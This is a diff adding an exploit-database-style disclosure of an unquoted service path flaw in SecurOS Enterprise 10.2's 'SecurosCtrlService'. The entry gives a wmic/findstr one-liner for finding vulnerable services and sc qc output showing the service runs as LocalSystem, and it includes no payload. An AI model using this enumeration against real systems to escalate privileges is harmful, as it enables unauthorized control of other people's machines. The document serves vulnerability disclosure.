@@ -1,0 +1,49 @@
+# Exploit Title: Intelligent Security System SecurOS Enterprise 10.2 - 'SecurosCtrlService' Unquoted Service Path
+# Discovery Date: 2019-10-28
+# Exploit Author: Alberto Vargas
+# Vendor Homepage: https://www.issivs.com/product-detail/secure-os-enterprise/
+# Software Link: https://www.issivs.com/schedule-a-free-demo/(trial version for unlicensed users)
+# Version: 10.2 R1
+# Tested on: Windows 10 Pro x64 Esp
+
+# Version: 10.0.18362
+
+# Schedule A Free Demo - ISS - Intelligent Security Systems<https://www.issivs.com/schedule-a-free-demo/>
+# Schedule a Free Demo A leading developer of security surveillance and control systems for 
+# networked digital video and audio recording, video image pattern processing and digital data transmission.
+# www.issivs.com
+
+# Summary: ISS’ global standard for video management, access control and video analytics, SecurOS™ Enterprise is perfectly suited for 
+# managing large and demanding installations. The Enterprise framework can manage and monitor an unlimited number of cameras and devices, apply 
+# intelligent video analytics, and act as an integration platform for a variety of 3rd party systems. Built to handle enterprise level deployments, 
+# SecurOS Enterprise, comes with built-in Native Failure functionality, Microsoft Active Directory / LDAP integration, and has an extensive set 
+# of Cybersecurity features making it one of the most reliable and secure video management platforms in the market today. SecurOS Enterprise 
+# supports all the features of the other 3 editions.
+
+# Description:    The application suffers from an unquoted search path issue impacting the service 'SecurosCtrlService'. This could potentially allow an 
+# authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. A successful attempt would require 
+# the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could 
+# potentially be executed during application startup or reboot. If successful, the local user’s code would execute with the elevated privileges
+# of the application.
+
+# Step to discover the unquoted Service:
+
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+SecurOS Control Service		SecurosCtrlService	C:\Program Files (x86)\ISS\SecurOS\securos_svc.exe	Auto
+
+# Service info:
+
+C:\Users\user>sc qc SecurosCtrlService
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: SecurosCtrlService
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\ISS\SecurOS\securos_svc.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : SecurOS Control Service
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
